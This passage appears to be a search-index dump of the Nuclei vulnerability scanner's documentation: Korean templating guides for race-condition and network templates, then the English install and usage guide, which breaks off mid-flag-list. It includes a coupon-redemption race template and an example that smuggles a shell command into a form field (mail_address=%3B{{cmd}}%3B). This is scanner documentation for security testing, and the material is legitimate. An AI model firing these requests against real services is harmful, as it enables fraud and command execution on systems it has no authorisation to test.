severity : info http : - raw : - | POST /coupons HTTP/1.1 Host: {{Hostname}} promo_code=20OFF race : true race_count : 10 matchers : - type : status part : header status : - 200 POST \uc694\uccad\uc744 \ucde8\uc57d\ud55c \uac83\uc73c\ub85c \uc758\uc2ec\ub418\ub294 \uc694\uccad\uc73c\ub85c \uad50\uccb4\ud558\uace0 \ud544\uc694\uc5d0 \ub530\ub77c race_count \ub97c \ubcc0\uacbd\ud558\uba74 \uc2e4\ud589\ud560 \uc900\ube44\uac00 \ub429\ub2c8\ub2e4. nuclei -t race.yaml -target https://api.target.com Multi request race condition testing \uacbd\uc7c1 \uc870\uac74\uc744 \uc774\uc6a9\ud558\uae30 \uc704\ud574 \uc5ec\ub7ec \uc694\uccad\uc744 \ubcf4\ub0b4\uc57c \ud558\ub294 \uc2dc\ub098\ub9ac\uc624\uc758 \uacbd\uc6b0 \uc2a4\ub808\ub4dc\ub97c \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. threads : 5 race : true threads \ub294 \uacbd\uc7c1 \uc870\uac74 \ud14c\uc2a4\ud2b8\ub97c \uc218\ud589\ud558\uae30 \uc704\ud574 \ud15c\ud50c\ub9bf\uc73c\ub85c \ub9cc\ub4e4\uace0\uc790 \ud558\ub294 \ucd1d \uc694\uccad \uc218\uc785\ub2c8\ub2e4. \ub2e4\uc74c\uc740 \uac8c\uc774\ud2b8 \ub85c\uc9c1\uc744 \uc0ac\uc6a9\ud558\uc5ec \ub3d9\uc2dc\uc5d0 \uc5ec\ub7ec(5) \uac1c\uc758 \uace0\uc720 \uc694\uccad\uc774 \uc804\uc1a1\ub418\ub294 \uc608\uc81c \ud15c\ud50c\ub9bf\uc785\ub2c8\ub2e4. id : multi-request-race info : name : Race condition testing with multiple requests author : pd-team severity : info http : - raw : - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=1 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=2 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=3 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=4 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=5 threads : 5 race : true Requests Annotation \uc694\uccad \uc778\ub77c\uc778 \uc8fc\uc11d\uc740 \uc694\uccad \uc18d\uc131/\ub3d9\uc791 \uc7ac\uc815\uc758\uc5d0 \ub530\ub77c \uc218\ud589\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. python/java \ud074\ub798\uc2a4 \uc8fc\uc11d\uacfc \ub9e4\uc6b0 \uc720\uc0ac\ud558\uba70 RFC \ub77c\uc778 \ubc14\ub85c \uc55e\uc5d0 \uc694\uccad\uc5d0 \ub123\uc5b4\uc57c \ud569\ub2c8\ub2e4. \ud604\uc7ac \ub2e4\uc74c \uc7ac\uc815\uc758\ub9cc \uc9c0\uc6d0\ub429\ub2c8\ub2e4.: @Host: \uc694\uccad\uc758 \uc2e4\uc81c \ub300\uc0c1\uc744 \uc7ac\uc815\uc758\ud569\ub2c8\ub2e4(\uc77c\ubc18\uc801\uc73c\ub85c \uc785\ub825\uc73c\ub85c \uc81c\uacf5\ub418\ub294 host/ip). ip/domain, port \ubc0f schema\uac00 \uc788\ub294 \uad6c\ubb38\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4(\uc608: domain.tld , domain.tld:port , http://domain.tld:port ). @tls-sni: \uc774\ub294 TLS \uc694\uccad\uc758 SNI \uc774\ub984(\uc77c\ubc18\uc801\uc73c\ub85c \uc785\ub825\uc73c\ub85c \uc81c\uacf5\ub41c \ud638\uc2a4\ud2b8 \uc774\ub984)\uc744 \uc7ac\uc815\uc758\ud569\ub2c8\ub2e4. \ubaa8\ub4e0 \ub9ac\ud130\ub7f4\uc744 \uc9c0\uc6d0\ud558\uba70 \ud2b9\uc218 \uac12 request.host \ub294 Host \ud5e4\ub354 \uac12\uc744 \uc0ac\uc6a9\ud569\ub2c8\ub2e4. @timeout: \uc0ac\uc6a9\uc790 \uc9c0\uc815 \uae30\uac04\uc5d0 \ub300\ud55c \uc694\uccad\uc758 \uc2dc\uac04 \ucd08\uacfc\ub97c \uc7ac\uc815\uc758\ud569\ub2c8\ub2e4. \ubb38\uc790\uc5f4 \ud615\uc2dd\uc758 \uae30\uac04\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. \uae30\uac04\uc744 \uc9c0\uc815\ud558\uc9c0 \uc54a\uc73c\uba74 \uae30\ubcf8 \uc2dc\uac04 \ucd08\uacfc \ud50c\ub798\uadf8 \uac12\uc774 \uc0ac\uc6a9\ub429\ub2c8\ub2e4. \ub2e4\uc74c \uc608\ub294 \uc694\uccad \ub0b4\uc758 \uc8fc\uc11d\uc744 \ubcf4\uc5ec\uc90d\ub2c8\ub2e4. - | @Host: https://projectdiscovery.io:443 POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 \uc774\uac83\uc740 \uc608\ub97c \ub4e4\uc5b4 \uc5ec\ub7ec \uc694\uccad\uc774 \uc788\ub294 \ud15c\ud50c\ub9bf\uc758 \uacbd\uc6b0\uc5d0 \ud2b9\ud788 \uc720\uc6a9\ud569\ub2c8\ub2e4. \ucd08\uae30 \uc694\uccad \uc774\ud6c4\uc5d0 \ud558\ub098\uc758 \uc694\uccad\uc744 \ud2b9\uc815 \ud638\uc2a4\ud2b8\uc5d0 \ub300\ud574 \uc218\ud589\ud574\uc57c \ud558\ub294 \uacbd\uc6b0(\uc608: API \uc720\ud6a8\uc131 \uac80\uc0ac): http : - raw : # this request will be sent to {{Hostname}} to get the token - | GET /getkey HTTP/1.1 Host: {{Hostname}} # This request will be sent instead to https://api.target.com:443 to verify the token validity - | @Host: https://api.target.com:443 GET /api/key={{token}} HTTP/1.1 Host: api.target.com:443 extractors : - type : regex name : token part : body regex : # random extractor of strings between prefix and suffix - 'prefix(.*)suffix' matchers : - type : word part : body words : - valid token \uc0ac\uc6a9\uc790 \uc9c0\uc815 timeout \uc8fc\uc11d\uc758 \uc608 - - | @timeout: 25s POST /conf_mail.php HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded mail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M","title":"Race conditions"},{"location":"kr/templating-guide/protocols/network/","text":"Network Requests \u00b6 Nuclei\ub294 \uc790\ub3d9\ud654 \uac00\ub2a5\ud55c Netcat \uc5ed\ud560\uc744 \ud558\uc5ec \uc0ac\uc6a9\uc790\uac00 \ubc14\uc774\ud2b8\ub97c \uc720\uc120\uc73c\ub85c \ubcf4\ub0b4\uace0 \ubc1b\uc744 \uc218 \uc788\uc73c\uba70 \uc751\ub2f5\uc5d0 \ub300\ud55c \uc77c\uce58 \ubc0f \ucd94\ucd9c \uae30\ub2a5\uc744 \uc81c\uacf5\ud569\ub2c8\ub2e4. \ub124\ud2b8\uc6cc\ud06c \uc694\uccad\uc740 \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud55c \uc694\uccad\uc758 \uc2dc\uc791\uc744 \uc9c0\uc815\ud558\ub294 network \ube14\ub85d\uc73c\ub85c \uc2dc\uc791\ud569\ub2c8\ub2e4. # \ud15c\ud50c\ub9bf \uc694\uccad\uc744 \ubc14\ub85c \uc5ec\uae30\uc5d0\uc11c \uc2dc\uc791\ud558\uc138\uc694. tcp : Inputs \u00b6 \uc694\uccad\uc758 \uccab \ubc88\uc9f8 \ud56d\ubaa9\uc740 **inputs**\uc785\ub2c8\ub2e4. \uc785\ub825\uc740 \uc11c\ubc84\ub85c \ubcf4\ub0bc \ub370\uc774\ud130\uc774\uba70 \uc120\ud0dd\uc801\uc73c\ub85c \uc11c\ubc84\uc5d0\uc11c \uc77d\uc744 \ub370\uc774\ud130\uc785\ub2c8\ub2e4. \uac00\uc7a5 \uac04\ub2e8\ud569\ub2c8\ub2e4. \ubb38\uc790\uc5f4\uc744 \uc9c0\uc815\ud558\uba74 \ub124\ud2b8\uc6cc\ud06c \uc18c\ucf13\uc744 \ud1b5\ud574 \uc804\uc1a1\ub429\ub2c8\ub2e4. # inputs\uc740 \uc11c\ubc84\uc5d0 \ubcf4\ub0bc \uc785\ub825 \ubaa9\ub85d\uc785\ub2c8\ub2e4. inputs : - data : \"TEST\\r\\n\" \ub610\ud55c \uba3c\uc800 \ub514\ucf54\ub529\ub418\uace0 Raw \ubc14\uc774\ud2b8\uac00 \uc11c\ubc84\ub85c \uc804\uc1a1\ub420 16\uc9c4\uc218\ub85c \uc778\ucf54\ub529\ub41c \ud14d\uc2a4\ud2b8\ub97c \ubcf4\ub0bc \uc218 \uc788\uc2b5\ub2c8\ub2e4. inputs : - data : \"50494e47\" type : hex - data : \"\\r\\n\" \ub3c4\uc6b0\ubbf8 \ud568\uc218 \ud45c\ud604\uc2dd\uc740 \uc785\ub825\uc5d0\uc11c\ub3c4 \uc815\uc758\ud560 \uc218 \uc788\uc73c\uba70 \uba3c\uc800 \ud3c9\uac00\ub41c \ub2e4\uc74c \uc11c\ubc84\ub85c \uc804\uc1a1\ub429\ub2c8\ub2e4. \ub9c8\uc9c0\ub9c9 Hex Encoded \uc608\uc81c\ub294 \uc774\ub7f0 \uc2dd\uc73c\ub85c \ub3c4\uc6b0\ubbf8 \ud568\uc218\uc640 \ud568\uaed8 \ubcf4\ub0bc \uc218 \uc788\uc2b5\ub2c8\ub2e4. inputs : - data : 'hex_decode(\"50494e47\")\\r\\n' \uc785\ub825\uc73c\ub85c \uc218\ud589\ud560 \uc218 \uc788\ub294 \ub9c8\uc9c0\ub9c9 \uc791\uc5c5\uc740 \uc18c\ucf13\uc5d0\uc11c \ub370\uc774\ud130\ub97c \uc77d\ub294 \uac83\uc785\ub2c8\ub2e4. 0\uc774 \uc544\ub2cc \uac12\uc73c\ub85c read-size \ub97c \uc9c0\uc815\ud558\uba74 \ud2b8\ub9ad\uc774 \uc218\ud589\ub429\ub2c8\ub2e4. \uc77d\uc740 \ub370\uc774\ud130\uc5d0 \uc774\ub984\uc744 \uc9c0\uc815\ud558\uc5ec \ud574\ub2f9 \ubd80\ubd84\uc5d0\uc11c \uc77c\uce58\ub97c \uc218\ud589\ud560 \uc218\ub3c4 \uc788\uc2b5\ub2c8\ub2e4. inputs : - read-size : 8 \uc5ec\ub7ec \ubc14\uc774\ud2b8\ub97c \uc77d\uace0 \uc77c\uce58\ud558\ub294 \uacbd\uc6b0\uc758 \uc608\uc785\ub2c8\ub2e4. inputs : - read-size : 8 name : prefix ... matchers : - type : word part : prefix words : - \"CAFEBABE\" \uc5ec\ub7ec \ub2e8\uacc4\ub97c \uc21c\uc11c\ub300\ub85c \uc5f0\uacb0\ud558\uc5ec \ub124\ud2b8\uc6cc\ud06c \uc77d\uae30/\uc4f0\uae30\ub97c \uc218\ud589\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. Host \u00b6 \uc694\uccad\uc758 \ub2e4\uc74c \ubd80\ubd84\uc740 \uc5f0\uacb0\ud560 **host**\uc785\ub2c8\ub2e4. \ub3d9\uc801 \ubcc0\uc218\ub97c \uacbd\ub85c\uc5d0 \ubc30\uce58\ud558\uc5ec \ub7f0\ud0c0\uc784\uc5d0 \uac12\uc744 \uc218\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ubcc0\uc218\ub294 {{ \ub85c \uc2dc\uc791\ud558\uace0 }} \ub85c \ub05d\ub098\uba70 \ub300\uc18c\ubb38\uc790\ub97c \uad6c\ubd84\ud569\ub2c8\ub2e4. Hostname - \ubcc0\uc218\ub294 \uba85\ub839\uc904\uc5d0 \uc81c\uacf5\ub41c \ud638\uc2a4\ud2b8 \uc774\ub984\uc73c\ub85c \ub300\uccb4\ub429\ub2c8\ub2e4. \uc608\uc81c \uc774\ub984 \uac12: host : - \"{{Hostname}}\" Nuclei\ub294 \ub610\ud55c \ub300\uc0c1 \uc11c\ubc84\uc5d0 TLS \uc5f0\uacb0\uc744 \uc218\ud589\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. Hostname \uc55e\uc5d0 \uc811\ub450\uc0ac\ub85c tls:// \ub97c \ucd94\uac00\ud558\uae30\ub9cc \ud558\uba74 \ub429\ub2c8\ub2e4. host : - \"tls://{{Hostname}}\" \ud638\uc2a4\ud2b8\uc5d0 \ud3ec\ud2b8\uac00 \uc9c0\uc815\ub418\uba74 \uc0ac\uc6a9\uc790\uac00 \uc81c\uacf5\ud55c \ud3ec\ud2b8\ub294 \ubb34\uc2dc\ub418\uace0 \ud15c\ud50c\ub9bf \ud3ec\ud2b8\uac00 \uc6b0\uc120\ud569\ub2c8\ub2e4. Matchers / Extractor Parts \u00b6 Matchers/Extractor\uc6a9 Network \ud504\ub85c\ud1a0\ucf5c\uc5d0\uc11c \uc9c0\uc6d0\ud558\ub294 \uc720\ud6a8\ud55c part \uac12\uc740 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4. Value Description request Network Request data Final Data Read From Network Socket raw / body / all All Data received from Socket Example Network Template \u00b6 \uc791\ub3d9\ud558\ub294 matchers\uac00 \uc788\ub294 \uc11c\ubc84\uc5d0\uc11c \uc2e4\ud589\ub418\ub294 MongoDB\ub97c \uac10\uc9c0\ud558\uae30 \uc704\ud55c '16\uc9c4\uc218'\ub85c \uc778\ucf54\ub529\ub41c \uc785\ub825\uc5d0 \ub300\ud55c \ucd5c\uc885 \uc608\uc81c \ud15c\ud50c\ub9bf \ud30c\uc77c\uc740 \uc544\ub798\uc5d0 \uc81c\uacf5\ub429\ub2c8\ub2e4. id : input-expressions-mongodb-detect info : name : Input Expression MongoDB Detection author : pd-team severity : info reference : https://github.com/orleven/Tentacle tcp : - inputs : - data : \"{{hex_decode('3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000')}}\" host : - \"{{Hostname}}\" read-size : 2048 matchers : - type : word words : - \"logicalSessionTimeout\" - \"localTime\" \ub354 \uc644\uc804\ud55c \uc608\uac00 \uc81c\uacf5\ub429\ub2c8\ub2e4. here","title":"Network"},{"location":"kr/templating-guide/protocols/network/#network-requests","text":"Nuclei\ub294 \uc790\ub3d9\ud654 \uac00\ub2a5\ud55c Netcat \uc5ed\ud560\uc744 \ud558\uc5ec \uc0ac\uc6a9\uc790\uac00 \ubc14\uc774\ud2b8\ub97c \uc720\uc120\uc73c\ub85c \ubcf4\ub0b4\uace0 \ubc1b\uc744 \uc218 \uc788\uc73c\uba70 \uc751\ub2f5\uc5d0 \ub300\ud55c \uc77c\uce58 \ubc0f \ucd94\ucd9c \uae30\ub2a5\uc744 \uc81c\uacf5\ud569\ub2c8\ub2e4. \ub124\ud2b8\uc6cc\ud06c \uc694\uccad\uc740 \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud55c \uc694\uccad\uc758 \uc2dc\uc791\uc744 \uc9c0\uc815\ud558\ub294 network \ube14\ub85d\uc73c\ub85c \uc2dc\uc791\ud569\ub2c8\ub2e4. # \ud15c\ud50c\ub9bf \uc694\uccad\uc744 \ubc14\ub85c \uc5ec\uae30\uc5d0\uc11c \uc2dc\uc791\ud558\uc138\uc694. tcp :","title":"Network Requests"},{"location":"kr/templating-guide/protocols/network/#inputs","text":"\uc694\uccad\uc758 \uccab \ubc88\uc9f8 \ud56d\ubaa9\uc740 **inputs**\uc785\ub2c8\ub2e4. \uc785\ub825\uc740 \uc11c\ubc84\ub85c \ubcf4\ub0bc \ub370\uc774\ud130\uc774\uba70 \uc120\ud0dd\uc801\uc73c\ub85c \uc11c\ubc84\uc5d0\uc11c \uc77d\uc744 \ub370\uc774\ud130\uc785\ub2c8\ub2e4. \uac00\uc7a5 \uac04\ub2e8\ud569\ub2c8\ub2e4. \ubb38\uc790\uc5f4\uc744 \uc9c0\uc815\ud558\uba74 \ub124\ud2b8\uc6cc\ud06c \uc18c\ucf13\uc744 \ud1b5\ud574 \uc804\uc1a1\ub429\ub2c8\ub2e4. # inputs\uc740 \uc11c\ubc84\uc5d0 \ubcf4\ub0bc \uc785\ub825 \ubaa9\ub85d\uc785\ub2c8\ub2e4. inputs : - data : \"TEST\\r\\n\" \ub610\ud55c \uba3c\uc800 \ub514\ucf54\ub529\ub418\uace0 Raw \ubc14\uc774\ud2b8\uac00 \uc11c\ubc84\ub85c \uc804\uc1a1\ub420 16\uc9c4\uc218\ub85c \uc778\ucf54\ub529\ub41c \ud14d\uc2a4\ud2b8\ub97c \ubcf4\ub0bc \uc218 \uc788\uc2b5\ub2c8\ub2e4. inputs : - data : \"50494e47\" type : hex - data : \"\\r\\n\" \ub3c4\uc6b0\ubbf8 \ud568\uc218 \ud45c\ud604\uc2dd\uc740 \uc785\ub825\uc5d0\uc11c\ub3c4 \uc815\uc758\ud560 \uc218 \uc788\uc73c\uba70 \uba3c\uc800 \ud3c9\uac00\ub41c \ub2e4\uc74c \uc11c\ubc84\ub85c \uc804\uc1a1\ub429\ub2c8\ub2e4. \ub9c8\uc9c0\ub9c9 Hex Encoded \uc608\uc81c\ub294 \uc774\ub7f0 \uc2dd\uc73c\ub85c \ub3c4\uc6b0\ubbf8 \ud568\uc218\uc640 \ud568\uaed8 \ubcf4\ub0bc \uc218 \uc788\uc2b5\ub2c8\ub2e4. inputs : - data : 'hex_decode(\"50494e47\")\\r\\n' \uc785\ub825\uc73c\ub85c \uc218\ud589\ud560 \uc218 \uc788\ub294 \ub9c8\uc9c0\ub9c9 \uc791\uc5c5\uc740 \uc18c\ucf13\uc5d0\uc11c \ub370\uc774\ud130\ub97c \uc77d\ub294 \uac83\uc785\ub2c8\ub2e4. 0\uc774 \uc544\ub2cc \uac12\uc73c\ub85c read-size \ub97c \uc9c0\uc815\ud558\uba74 \ud2b8\ub9ad\uc774 \uc218\ud589\ub429\ub2c8\ub2e4. \uc77d\uc740 \ub370\uc774\ud130\uc5d0 \uc774\ub984\uc744 \uc9c0\uc815\ud558\uc5ec \ud574\ub2f9 \ubd80\ubd84\uc5d0\uc11c \uc77c\uce58\ub97c \uc218\ud589\ud560 \uc218\ub3c4 \uc788\uc2b5\ub2c8\ub2e4. inputs : - read-size : 8 \uc5ec\ub7ec \ubc14\uc774\ud2b8\ub97c \uc77d\uace0 \uc77c\uce58\ud558\ub294 \uacbd\uc6b0\uc758 \uc608\uc785\ub2c8\ub2e4. inputs : - read-size : 8 name : prefix ... matchers : - type : word part : prefix words : - \"CAFEBABE\" \uc5ec\ub7ec \ub2e8\uacc4\ub97c \uc21c\uc11c\ub300\ub85c \uc5f0\uacb0\ud558\uc5ec \ub124\ud2b8\uc6cc\ud06c \uc77d\uae30/\uc4f0\uae30\ub97c \uc218\ud589\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4.","title":"Inputs"},{"location":"kr/templating-guide/protocols/network/#host","text":"\uc694\uccad\uc758 \ub2e4\uc74c \ubd80\ubd84\uc740 \uc5f0\uacb0\ud560 **host**\uc785\ub2c8\ub2e4. \ub3d9\uc801 \ubcc0\uc218\ub97c \uacbd\ub85c\uc5d0 \ubc30\uce58\ud558\uc5ec \ub7f0\ud0c0\uc784\uc5d0 \uac12\uc744 \uc218\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ubcc0\uc218\ub294 {{ \ub85c \uc2dc\uc791\ud558\uace0 }} \ub85c \ub05d\ub098\uba70 \ub300\uc18c\ubb38\uc790\ub97c \uad6c\ubd84\ud569\ub2c8\ub2e4. Hostname - \ubcc0\uc218\ub294 \uba85\ub839\uc904\uc5d0 \uc81c\uacf5\ub41c \ud638\uc2a4\ud2b8 \uc774\ub984\uc73c\ub85c \ub300\uccb4\ub429\ub2c8\ub2e4. \uc608\uc81c \uc774\ub984 \uac12: host : - \"{{Hostname}}\" Nuclei\ub294 \ub610\ud55c \ub300\uc0c1 \uc11c\ubc84\uc5d0 TLS \uc5f0\uacb0\uc744 \uc218\ud589\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. Hostname \uc55e\uc5d0 \uc811\ub450\uc0ac\ub85c tls:// \ub97c \ucd94\uac00\ud558\uae30\ub9cc \ud558\uba74 \ub429\ub2c8\ub2e4. host : - \"tls://{{Hostname}}\" \ud638\uc2a4\ud2b8\uc5d0 \ud3ec\ud2b8\uac00 \uc9c0\uc815\ub418\uba74 \uc0ac\uc6a9\uc790\uac00 \uc81c\uacf5\ud55c \ud3ec\ud2b8\ub294 \ubb34\uc2dc\ub418\uace0 \ud15c\ud50c\ub9bf \ud3ec\ud2b8\uac00 \uc6b0\uc120\ud569\ub2c8\ub2e4.","title":"Host"},{"location":"kr/templating-guide/protocols/network/#matchers-extractor-parts","text":"Matchers/Extractor\uc6a9 Network \ud504\ub85c\ud1a0\ucf5c\uc5d0\uc11c \uc9c0\uc6d0\ud558\ub294 \uc720\ud6a8\ud55c part \uac12\uc740 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4. Value Description request Network Request data Final Data Read From Network Socket raw / body / all All Data received from Socket","title":"Matchers / Extractor Parts"},{"location":"kr/templating-guide/protocols/network/#example-network-template","text":"\uc791\ub3d9\ud558\ub294 matchers\uac00 \uc788\ub294 \uc11c\ubc84\uc5d0\uc11c \uc2e4\ud589\ub418\ub294 MongoDB\ub97c \uac10\uc9c0\ud558\uae30 \uc704\ud55c '16\uc9c4\uc218'\ub85c \uc778\ucf54\ub529\ub41c \uc785\ub825\uc5d0 \ub300\ud55c \ucd5c\uc885 \uc608\uc81c \ud15c\ud50c\ub9bf \ud30c\uc77c\uc740 \uc544\ub798\uc5d0 \uc81c\uacf5\ub429\ub2c8\ub2e4. id : input-expressions-mongodb-detect info : name : Input Expression MongoDB Detection author : pd-team severity : info reference : https://github.com/orleven/Tentacle tcp : - inputs : - data : \"{{hex_decode('3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000')}}\" host : - \"{{Hostname}}\" read-size : 2048 matchers : - type : word words : - \"logicalSessionTimeout\" - \"localTime\" \ub354 \uc644\uc804\ud55c \uc608\uac00 \uc81c\uacf5\ub429\ub2c8\ub2e4. here","title":"Example Network Template"},{"location":"nuclei/get-started/","text":"Automate Vulnerability Scans with Nuclei \u00b6 Nuclei can help you ensure the security of complex networks / applications. With vulnerability scans, Nuclei can identify security issues on your network. Once configured, Nuclei can provide detailed information on each vulnerability, including: Severity Impact Description Remediation Once you've set up templates, you can automate scans of your systems with every change to your network, and with every discovery of new security issues. In this Getting Started guide, we describe how you can set up Nuclei to automate vulnerability scans on a relatively simple network. You can then use our Templating Guide to customize Nuclei for your networks. Nuclei Features \u00b6 Features. HTTP , DNS , TCP , SSL , FILE protocol support Fully configurable templates. Large scale scanning. Out of band based detection. Easily write your own templates. Nuclei Installation \u00b6 Go go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest Info Nuclei require latest GO version to install successfully. Brew brew install nuclei Info Supported in macOS (or Linux) Docker docker pull projectdiscovery/nuclei:latest Github git clone https://github.com/projectdiscovery/nuclei.git; \\ cd nuclei/v2/cmd/nuclei; \\ go build; \\ mv nuclei /usr/local/bin/; \\ nuclei -version; Info Nuclei require the latest GO version to install successfully. Binary https://github.com/projectdiscovery/nuclei/releases Tip Download the latest binary for your OS. Unzip the ready to run binary. Helm git clone https://github.com/projectdiscovery/nuclei.git cd nuclei/helm helm upgrade --install nuclei . -f values.yaml Tip This Helm chart creates two primary resources (intended to be configured via values.yaml ): A Kubernetes CronJob to run Nuclei on a defined schedule An Interactsh service for Nuclei to use Nuclei Templates \u00b6 Public Templates \u00b6 Nuclei has built-in support for automatic template download/update from nuclei templates project which provides community-contributed list of ready-to-use templates that is constantly updated. Nuclei checks for new community template releases upon each execution and automatically downloads the latest version when available. optionally, this feature can be disabled using the -duc cli flag or the configuration file. Custom Templates \u00b6 Users can create custom templates on a personal public / private GitHub / AWS Bucket that they wish to run / update while using nuclei from any environment without manually downloading the GitHub repository everywhere. To use this feature, users need to set the following environment variables: For GitHub Project export GITHUB_TOKEN=gh_XXX export GITHUB_TEMPLATE_REPO=my_nuclei_template For GitLab Project export GITLAB_SERVER_URL=https://gitlab.com # The GitLab token must have the read_api and read_repository scope export GITLAB_TOKEN=XXXXXXXXXX # Comma separated list of repository IDs (not names) export GITLAB_REPOSITORY_IDS=12345,67890 For AWS Bucket export AWS_ACCESS_KEY=AKIAXXXXXXXX export AWS_SECRET_KEY=XXXXXX export AWS_REGION=us-xxx-1 export AWS_TEMPLATE_BUCKET=aws_bucket_name For Azure Blob Storage export AZURE_TENANT_ID=00000000-0000-0000-0000-000000000000 export AZURE_CLIENT_ID=00000000-0000-0000-0000-000000000000 export AZURE_CLIENT_SECRET=00000000-0000-0000-0000-000000000000 export AZURE_SERVICE_URL=https://XXXXXXXXXX.blob.core.windows.net/ export AZURE_CONTAINER_NAME=templates Environment variables can also be provided to disable download from default and custom template locations: export DISABLE_NUCLEI_TEMPLATES_PUBLIC_DOWNLOAD=true # Disable download from the default nuclei-templates project export DISABLE_NUCLEI_TEMPLATES_GITHUB_DOWNLOAD=true # Disable download from public / private GitHub project(s) export DISABLE_NUCLEI_TEMPLATES_GITLAB_DOWNLOAD=true # Disable download from public / private GitLab project(s) export DISABLE_NUCLEI_TEMPLATES_AWS_DOWNLOAD=true # Disable download from public / private AWS Bucket(s) export DISABLE_NUCLEI_TEMPLATES_AZURE_DOWNLOAD=true # Disable download from public / private Azure Blob Storage Once the environment variables are set, following command to download the custom templates: nuclei -update-templates This command will clone the repository containing the custom templates to the default nuclei templates directory ( $HOME/nuclei-templates/github/ ). The directory structure of the custom templates looks as follows: tree $HOME /nuclei-templates/ nuclei-templates/ \u2514\u2500\u2500 github/ $GH_REPO_NAME # Custom templates downloaded from public / private GitHub project \u2514\u2500\u2500 gitlab/ $GL_REPO_NAME # Custom templates downloaded from public / private GitLab project \u2514\u2500\u2500 s3/ $BUCKET_NAME # Custom templates downloaded from public / private AWS Bucket \u2514\u2500\u2500 azure/ $CONTAINER_NAME # Custom templates downloaded from public / private Azure Blob Storage Users can then use the custom templates with the -t flag as follows: nuclei -t github/my_custom_template -u https://example.com The nuclei engine can be updated to latest version by using the -update flag. Tip Writing your own unique templates will always keep you one step ahead of others. Nuclei Usage \u00b6 nuclei -h This will display help for the tool. Here are all the switches it supports. Nuclei is a fast, template based vulnerability scanner focusing on extensive configurability, massive extensibility and ease of use. Usage: nuclei [flags] Flags: TARGET: -u, -target string[] target URLs/hosts to scan -l, -list string path to file containing a list of target URLs/hosts to scan (one per line) -resume string resume scan using resume.cfg (clustering will be disabled) -sa, -scan-all-ips scan all the IP's associated with dns record -iv, -ip-version string[] IP version to scan of hostname (4,6) - (default 4) TEMPLATES: -nt, -new-templates run only new templates added in latest nuclei-templates release -ntv, -new-templates-version string[] run new templates added in specific version -as, -automatic-scan automatic web scan using wappalyzer technology detection to tags mapping -t, -templates string[] list of template or template directory to run (comma-separated, file) -tu, -template-url string[] list of template urls to run (comma-separated, file) -w, -workflows string[] list of workflow or workflow directory to run (comma-separated, file) -wu, -workflow-url string[] list of workflow urls to run (comma-separated, file) -validate validate the passed templates to nuclei -nss, -no-strict-syntax disable strict syntax check on templates -td, -template-display displays the templates content -tl list all available templates FILTERING: -a, -author string[] templates to run based on authors (comma-separated, file) -tags string[] templates to run based on tags (comma-separated, file) -etags, -exclude-tags string[] templates to exclude based on tags (comma-separated, file) -itags, -include-tags string[] tags to be executed even if they are excluded either by default or configuration -id, -template-id string[] templates to run based on template ids (comma-separated, file) -eid, -exclude-id string[] templates to exclude based on template ids (comma-separated, file) -it, -include-templates string[] templates to be executed even if they are excluded either by default or configuration -et, -exclude-templates string[] template or template directory to exclude (comma-separated, file) -em, -exclude-matchers string[] template matchers to exclude in result -s, -severity value[] templates to run based on severity. Possible values: info, low, medium, high, critical, unknown -es, -exclude-severity value[] templates to exclude based on severity. Possible values: info, low, medium, high, critical, unknown -pt, -type value[] templates to run based on protocol type. Possible values: dns, file, http, headless, tcp, workflow, ssl, websocket, whois -ept, -exclude-type value[] templates to exclude based on protocol type. Possible values: dns, file, http, headless, tcp, workflow, ssl, websocket, whois -tc, -template-condition string[] templates to run based on expression condition OUTPUT: -o, -output string output file to write found issues/vulnerabilities -sresp, -store-resp store all request/response passed through nuclei to output directory -srd, -store-resp-dir string store all request/response passed through nuclei to custom directory (default \"output\") -silent display findings only -nc, -no-color disable output content coloring (ANSI escape codes) -j, -jsonl write output in JSONL(ines) format -irr, -include-rr -omit-raw include request/response pairs in the JSON, JSONL, and Markdown outputs (for findings only) [DEPRECATED use -omit-raw] (default true) -or, -omit-raw omit request/response pairs in the JSON, JSONL, and Markdown outputs (for findings only) -nm, -no-meta disable printing result metadata in cli output -ts, -timestamp enables printing timestamp in cli output -rdb, -report-db string nuclei reporting database (always use this to persist report data) -ms, -matcher-status display match failure status -me, 